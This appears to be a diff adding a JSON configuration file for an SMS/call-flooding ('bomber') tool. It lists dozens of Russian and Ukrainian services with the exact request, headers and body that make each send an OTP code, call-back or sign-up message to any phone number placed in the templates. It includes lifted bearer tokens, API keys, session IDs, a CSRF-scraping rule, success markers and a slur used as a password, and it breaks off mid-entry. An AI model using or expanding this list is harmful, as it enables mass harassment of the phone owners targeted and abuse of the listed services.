@@ -1,0 +1,2074 @@
+{
+  "free": [
+    {
+      "name": "Alkoteka",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://web.alkoteka.com/api/v1/signin/start?city_uuid=396df2b5-7b2b-11eb-80cd-00155d039009",
+      "headers": {
+        "Accept": "*/*",
+        "authorization": "Bearer 1|su78w7U7kmClIkn3IT7ys3aptCqrH6IEQ3KAVL64",
+        "user-agent": "Dart/2.18 (dart:io)",
+        "x-mobile-version": "93.5.29"
+      },
+      "body": "{\"phone\":\"{{RU2}}\",\"method\":\"sms\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Apostrof_SU",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://apostrof.su/assets/components/ajaxform/action.php",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://apostrof.su",
+        "Referer": "https://apostrof.su/"
+      },
+      "body": "phone={{PLUS}}&name=%D0%90%D0%BD%D0%B4%D1%80%D0%B5%D0%B9&form_key=f18c223d02997776&agree=on",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Apteka",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.apteka.ru/Auth/Auth_Code",
+      "headers": {
+        "Accept": "application/json",
+        "Accept-Charset": "UTF-8",
+        "adrcid": "UVRVQldZXm9QSkVcUVEVBhoAHg==",
+        "device-id": "1be287ef32e3b44d",
+        "Interface": "Light",
+        "TZ": "-180",
+        "User-Agent": "android_apteka/4.0.98 (1be287ef32e3b44d, Ver 34, Density 3.0, Redmi Note 8T)",
+        "user-session-id": "SBV_q485bb25r3150e15w287o312Bf305e5307111868D281Je75Xb59d/",
+        "X-SESSION-ID": "a05bbb96-806a-4fcf-84ce-be1a15c5f8f9",
+        "X-DREG-TST": "1789795994720"
+      },
+      "body": "{\"phone\":\"{{RU1}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "AtomsBT",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://waapi.atomsbt.ru/api/sms/getsdata",
+      "headers": {
+        "Accept": "*/*",
+        "User-Agent": "okhttp/4.11.0"
+      },
+      "body": "{\"phone\":\"{{RAW}}\",\"osType\":\"android\",\"version\":\"4.1.0\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "BizonPizza",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://bizonpizza.ru/api/user/register",
+      "headers": {
+        "uuid": "90056497-ea40-ea40-ea40-7543c518a09e",
+        "x-api-key": "1483730",
+        "x-brand-id": "1",
+        "x-platform": "ssr",
+        "sitenew": "1"
+      },
+      "body": "{\"phone\":\"{{NAT}}\",\"verify_type\":\"sms\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Bolshoe",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.bolshoe.tv/v1/agregator/sendAuth",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://bolshoe.tv",
+        "Referer": "https://bolshoe.tv/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
+        "X-APP-ACCESS-TOKEN": "BgnsQodyFZdoV7e36uo7eN8n35zE0mDWyW0fj8me",
+        "X-APP-BUILD": "99",
+        "X-APP-MODE": "WEB",
+        "X-APP-PLATFORM": "WEB",
+        "X-DEV-PLATFORM": "PC_WEB"
+      },
+      "body": "{\"auth_type\":\"phone\",\"uid\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Brandshop",
+      "country": "RU",
+      "method": "GET",
+      "url": "https://api.brandshop.ru/xhr/login/authorizeurl/?phone={{RU3}}&channel=&content=&admitadUid=&ru=%2F&_ym_uid=1756120040786222109&v=1756120091047",
+      "headers": {},
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "DPO_Sochi",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://dpo-sochi.ru/forms",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 YaBrowser/25.2.0.0 Safari/537.36",
+        "Origin": "https://dpo-sochi.ru",
+        "Referer": "https://dpo-sochi.ru/"
+      },
+      "body": "name=%D0%95%D0%B3%D0%BE%D1%80&phone={{RAW}}&form_name=callback",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "GKRS_SPB_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://gkrs-spb.ru/api/v1/sms/form/",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
+        "Origin": "https://gkrs-spb.ru",
+        "Referer": "https://gkrs-spb.ru/"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Invitro",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://www.invitro.ru/golk/auth/api/v1/auth/login/send-code",
+      "headers": {
+        "Origin": "https://www.invitro.ru",
+        "Referer": "https://www.invitro.ru/"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Kari",
+      "country": "RU",
+      "method": "GET",
+      "url": "https://pr.kari.com/api/sendsms/{{RAW}}",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "ru-RU,ru;q=0.6",
+        "X-Requested-With": "XMLHttpRequest",
+        "Referer": "https://pr.kari.com/"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "KoronaPay",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://koronapay.com/transfers/online/api/users/otps",
+      "headers": {},
+      "body": "phone={{RAW}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "LifeMart",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.lifemart.ru/api/user/register",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en;q=0.9",
+        "app-id": "lifemart",
+        "app-version": "1.59.1",
+        "Content-Language": "en",
+        "User-Agent": "LifeMart/286 CFNetwork/3860.200.71 Darwin/25.1.0",
+        "uuid": "ea4634f3-60de-4c0a-a59d-36bb47e85523-zm",
+        "x-api-key": "15992094",
+        "x-platform": "ios"
+      },
+      "body": "{\"verify_type\":\"sms\",\"phone\":\"{{NAT}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "MamaDeti",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.lk.mamadeti.ru/api/v2.1/Account/GetRegisterSeed",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://lk.mamadeti.ru",
+        "Referer": "https://lk.mamadeti.ru/"
+      },
+      "body": "{\"phoneNumber\":\"{{RU5}}\",\"seedVersion\":1}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "MetallDK",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://metall-dk.ru/auth/?login=yes",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": "https://metall-dk.ru",
+        "Referer": "https://metall-dk.ru/",
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "USER_PHONE_NUMBER={{RU1}}&backurl=%2F&AUTH_FORM=Y&TYPE=AUTH&POPUP_AUTH=Y&AUTH_PHONE_OR_LOGIN={{RU1}}&Login=Y&Login1=Y",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "MosPizza",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://mos.pizza/api/auth/resetCode",
+      "headers": {
+        "accept": "application/json",
+        "accept-language": "ru-RU,ru;q=0.9",
+        "lang": "ru",
+        "origin": "https://mos.pizza",
+        "referer": "https://mos.pizza/",
+        "timezone": "Europe/Moscow",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
+        "sessionid": "eab4c728-6799-48c8-be63-2f6e420bf1a1",
+        "cookie": "sessionId=eab4c728-6799-48c8-be63-2f6e420bf1a1; NEXT_LOCALE=ru"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "MyShop",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=d51a4d42-c5e8-43ce-a24d-383a3b29f17ae821ed918",
+      "headers": {},
+      "body": "phone_code=7&phone={{RAW}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Oyo",
+      "country": "RU",
+      "method": "GET",
+      "url": "https://www.oyorooms.com/api/pwa/generateotp?phone={{RAW}}&country_code=%2B7&nod=4&locale=en",
+      "headers": {},
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "PDBG_FetchIt",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://pdbg.ru/assets/components/fetchit/action.php",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.127 ADG/11.1.4805 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Origin": "https://pdbg.ru",
+        "Referer": "https://pdbg.ru/"
+      },
+      "body": "phone={{PLUS}}&name=%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B0%D0%BD%D0%B4%D1%80&form_key=317643e7cca87850",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Pomogatel",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api3.pomogatel.ru/accounts",
+      "headers": {
+        "platform": "web",
+        "session-details": "46171b13-d622-4e66-8582-2a1f1808ef7e:b88775e0-d5f9-49da-96a4-035048400a51",
+        "user-language": "ru-RU",
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15"
+      },
+      "body": "{\"address\":\"Москва, 2-я Владимирская\",\"country\":\"Россия\",\"locality\":\"Москва\",\"street\":\"2-я Владимирская улица\",\"latitude\":\"55.751264\",\"longitude\":\"37.784524\",\"roleId\":2,\"phoneNumber\":\"{{NAT}}\",\"phoneNumberMasked\":\"{{RU3}}\",\"type\":\"phone\",\"specializationId\":2}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Prosv",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://id.prosv.ru/api/signin/phone/provision",
+      "headers": {},
+      "body": "{\"identifier\":\"{{RU7}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Ralf",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://ralf.ru/local/ajax/check_personal_data.php",
+      "headers": {},
+      "body": "phoneNumber={{RAW}}&email=",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "RedDragon_SPB",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://reddragon-spb.ru/skcallback/",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
+        "Origin": "https://reddragon-spb.ru",
+        "Referer": "https://reddragon-spb.ru/"
+      },
+      "body": "name=%D0%A1%D0%B5%D1%80%D0%B3%D0%B5%D0%B9&phone={{RAW}}",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "RiveGauche",
+      "country": "RU",
+      "method": "GET",
+      "url": "https://api.rivegauche.ru/rg/v1/newRG/customers/current/contacts/confirmation-options?phone={{PLUS}}&configGroupCode=login",
+      "headers": {},
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Robokassa_SMS",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://login.robokassa.ru/auth/send/multiChannel/code",
+      "headers": {},
+      "body": "{\"messageType\":\"SigmaSMSSMS\",\"confirmationDestination\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "RolikSushi",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://rolik-sushi.ru/api/user/register",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "ru-RU,ru;q=0.9",
+        "User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+        "uuid": "3f4eaa5a-745f-4a9e-9c18-07ebb8206c78",
+        "x-api-key": "10244218",
+        "x-brand-id": "1",
+        "x-platform": "ssr",
+        "sitenew": "1",
+        "Referer": "https://rolik-sushi.ru/"
+      },
+      "body": "{\"phone\":\"{{NAT}}\",\"verify_type\":\"call\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "SPB_Ritual",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://spb.ritual.ru/local/api/form.php",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+        "Origin": "https://spb.ritual.ru",
+        "Referer": "https://spb.ritual.ru/"
+      },
+      "body": "name=%D0%90%D0%BD%D1%82%D0%BE%D0%BD&phone={{RAW}}&form_id=callback",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Stanki_Lead",
+      "country": "RU",
+      "method": "GET",
+      "url": "https://www.stanki.ru/ajax/?ACTION=all_lead&phone={{RAW}}&name=%D0%9C%D0%B0%D1%82%D0%B2%D0%B5%D0%B9&email=%D0%BC%D0%B0%D0%BA%D1%81%D0%B8%D0%BC1640%40inbox.ru",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Referer": "https://www.stanki.ru/"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "StrikePlanet",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://strikeplanet.ru/local/ajax/forms.php",
+      "headers": {},
+      "body": "IB=authorization&typeAuthentication=sms&phone_code=%2B7&phone={{RAW}}&eventType=voicecode&event=voicecode",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Sunlight",
+      "country": "RU",
+      "method": "POST",
+      "url": "https://api.sunlight.net/modules/customer-auth/v1/web/send/",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://sunlight.net",
+        "Referer": "https://sunlight.net/",
+        "customer-source": "",
+        "user-local-time": "",
+        "User-Agent": "",
+        "Accept-Language": "ru-RU,ru;q=0.5"
+      },
+      "body": "{\"phone\":\"{{PLUS}}\",\"source\":\"web_header\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "ABankATB",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://a-bank.com.ua/backend/api/v1/corezoid",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+        "origin": "https://a-bank.com.ua",
+        "referer": "https://a-bank.com.ua/cards/atb",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.4122.1586 Mobile Safari/537.36"
+      },
+      "body": "{\"conv_data\":{\"phone\":\"{{PLUS}}\",\"product\":\"atb\"},\"hash\":\"4RR2342L90V22AE7\",\"_\":1789795994759}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "AutoClub365",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://autoclub365.com.ua/order?",
+      "headers": {
+        "Accept": "*/*",
+        "Referer": "https://autoclub365.com.ua/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "name=%D0%9C%D0%B0%D1%80%D1%82%D1%8C%D1%8F%D0%BD+%D0%94%D0%B0%D0%B2%D1%8B%D0%B4%D0%BE%D0%B2%D0%B8%D1%87+%D0%92%D0%B8%D0%BD%D0%BE%D0%B3%D1%80%D0%B0%D0%B4%D0%BE%D0%B2&phone={{UA6}}&src=site",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "BondDelivery",
+      "country": "UA",
+      "method": "GET",
+      "url": "https://bond.delivery/cliententer//passwordsent/?phone={{RAW}}",
+      "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,en-GB;q=0.6,en;q=0.5,ru-RU;q=0.4,en-US;q=0.3",
+        "Referer": "https://bond.delivery/",
+        "Sec-CH-UA": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Google Chrome\";v=\"146\"",
+        "Sec-CH-UA-Mobile": "?0",
+        "Sec-CH-UA-Platform": "\"macOS\"",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "same-origin",
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "CreditKasa",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.creditkasa.ua/public/auth/sendAcceptanceCode",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "ru-RU,ru;q=0.9",
+        "cache-control": "no-cache",
+        "origin": "https://navse.in.ua",
+        "pragma": "no-cache",
+        "priority": "u=1, i",
+        "referer": "https://navse.in.ua/",
+        "sec-ch-ua": "\"Not=A?Brand\";v=\"99\", \"Brave\";v=\"151\", \"Chromium\";v=\"151\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "cross-site",
+        "sec-gpc": "1",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
+      },
+      "body": "{\"mobilePhone\":\"{{RAW}}\",\"productGroup\":\"INSTALLMENT\",\"brandName\":\"NaVse\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "CreditKasaPDL",
+      "country": "UA",
+      "method": "GET",
+      "url": "https://api.creditkasa.ua/public/auth/sendAcceptanceCode?productGroup=PDL&phone={{RAW}}&brandName=CreditKasa",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+        "origin": "https://creditkasa.com.ua",
+        "referer": "https://creditkasa.com.ua/",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1"
+      },
+      "body": "",
+      "content_type": "",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "GudWork",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://gudwork.com.ua/api/via-phone-number",
+      "headers": {
+        "Origin": "https://gudfoodhome.com.ua",
+        "Referer": "https://gudfoodhome.com.ua/",
+        "X-Line-Header": "gudfoodhome.com.ua",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.9935.1258 Mobile Safari/537.36"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "LeroyMerlinUA",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://gtdp.api.devportal.adeo.cloud/backend-ecommerce-backend-api/v1/v1/Identity/Login",
+      "headers": {
+        "accept": "application/json",
+        "origin": "https://www.leroymerlin.ua",
+        "referer": "https://www.leroymerlin.ua/",
+        "user-agent": "\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3312.0 Safari/537.36\"",
+        "x-api-key": "945233fe-4966-4586-b9f3-f12439b8ad39",
+        "x-brand-id": "1",
+        "x-client-id": "1",
+        "x-gateway-apikey": "zfJZbkImwn0XqskUKkgWTJW0xCuit9rZ",
+        "x-locale": "ua",
+        "x-region": "UA"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Portmone",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://gate.portmone.com.ua/",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://www.portmone.com.ua",
+        "Referer": "https://www.portmone.com.ua/"
+      },
+      "body": "{\"id\":\"6ae1eddf4ddc968653741f5ffd144364b1b388d4d0cf00d53075c62b70171850\",\"method\":\"AUTH_signUpClient\",\"params\":{\"data\":{\"lang\":\"ru\",\"login\":\"{{RAW}}\",\"password\":\"yapidor\",\"emailAddress\":\"mjasnikovamilitsa5691@ukr.net\",\"attribute1\":\"Регистрация на сайте\",\"attribute4\":\"Portmone.Terminal (r3)\",\"fp\":\"cca4f304ea5f86e463458800d8151212\",\"marketingData\":{\"client_id\":\"\",\"dynamic_ids\":\"\",\"gclid\":\"\",\"utm_source\":\"google\",\"utm_medium\":\"organic\",\"utm_campaign\":\"(none)\",\"utm_content\":\"(none)\",\"utm_term\":\"(none)\"},\"phoneCheck\":\"phone_call\",\"shopSiteId\":\"4479\",\"uid\":\"2e167df933de547a5fc39f629502692b\"}}}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Prostor",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://prostor.ua/ru/prostor_customer/account/sendOtp/",
+      "headers": {
+        "Accept": "*/*",
+        "Origin": "https://prostor.ua",
+        "Referer": "https://prostor.ua/ru/",
+        "X-Requested-With": "XMLHttpRequest"
+      },
+      "body": "phone_number={{RAW}}&form_key=",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "Sushiya",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://www.sushiya.ua/api/v1/user/auth",
+      "headers": {
+        "Origin": "https://www.sushiya.ua",
+        "Referer": "https://www.sushiya.ua/",
+        "Authorization": "Bearer demo"
+      },
+      "body": "phone={{NAT}}&need_skeep=",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "SweetTV",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://api.sweet.tv/SignupService/SetPhone.json",
+      "headers": {
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
+      },
+      "body": "{\"device\":{\"type\":\"DT_Web_Browser\",\"application\":{\"type\":\"AT_SWEET_TV_Player\"},\"model\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)\",\"firmware\":{\"versionCode\":1,\"versionString\":\"3.2.28\"},\"uuid\":\"1f13dc4a-a85e-4ac4-bf39-979e11920ce0\",\"supported_drm\":{\"widevine_modular\":true}},\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "ksd.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://prod-api.ksd.ua/graphql",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
+      },
+      "body": "{\"operationName\":\"MutationSendAuthPhoneCode\",\"query\":\"mutation MutationSendAuthPhoneCode($phone: String!, $recaptcha: String) {\\n  userSendAuthPhoneCode(phone: $phone, recaptcha: $recaptcha)\\n}\",\"variables\":{\"phone\":\"{{PLUS}}\",\"recaptcha\":null}}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "podorozhnyk.com",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://ucb.l.podorozhnyk.com/api/send/otp",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "PizzaSushiHouse_UA_SMS",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://pizza-house.eatery.club/site/v1/pre-login",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Origin": "https://pizzasushihouse.com",
+        "Referer": "https://pizzasushihouse.com/",
+        "locale": "uk"
+      },
+      "body": "{\"phone\":\"{{RAW}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"status\":true",
+      "api_error": "\"status\":false"
+    },
+    {
+      "name": "robota.ua",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://dracula.robota.ua/",
+      "headers": {
+        "Content-Type": "application/json",
+        "Origin": "https://robota.ua",
+        "Referer": "https://robota.ua/"
+      },
+      "body": "{\"operationName\":\"SendSmsCode\",\"query\":\"mutation SendSmsCode($phone: String!) {\\n  users {\\n    login {\\n      otpLogin {\\n        sendConfirmation(phone: $phone) {\\n          status\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\",\"variables\":{\"phone\":\"{{RAW}}\"}}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true
+    },
+    {
+      "name": "MybizOTP",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://app.mybiz.com.ua/entry",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Origin": "https://app.mybiz.com.ua",
+        "Referer": "https://app.mybiz.com.ua/entry"
+      },
+      "body": "_token={{CSRF}}&phone={{UASPACE}}&entry_otp_code=&agree=on&serviceman_agree=on",
+      "content_type": "application/x-www-form-urlencoded",
+      "needs_prepare": false,
+      "has_phone": true,
+      "csrf": {
+        "url": "https://app.mybiz.com.ua/entry",
+        "regex": "name=\"_token\"\\s+value=\"([^\"]+)\"",
+        "ttl": 300
+      },
+      "api_ok": "\"status\":true"
+    },
+    {
+      "name": "KyivstarAccountOTP",
+      "country": "UA",
+      "method": "POST",
+      "url": "https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk",
+      "headers": {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "Origin": "https://account.kyivstar.ua",
+        "Referer": "https://account.kyivstar.ua/"
+      },
+      "body": "{\"action\":\"registration\",\"captcha\":null,\"login\":\"{{UALOCAL}}\"}",
+      "content_type": "application/json",
+      "needs_prepare": false,
+      "has_phone": true,
+      "api_ok": "\"success\":true",
+      "api_error": "\"status\":400"
+    },
+    {
+      "name": "shop.kyivstar.ua",
+      "country": "UA",
+      "method": "GET",
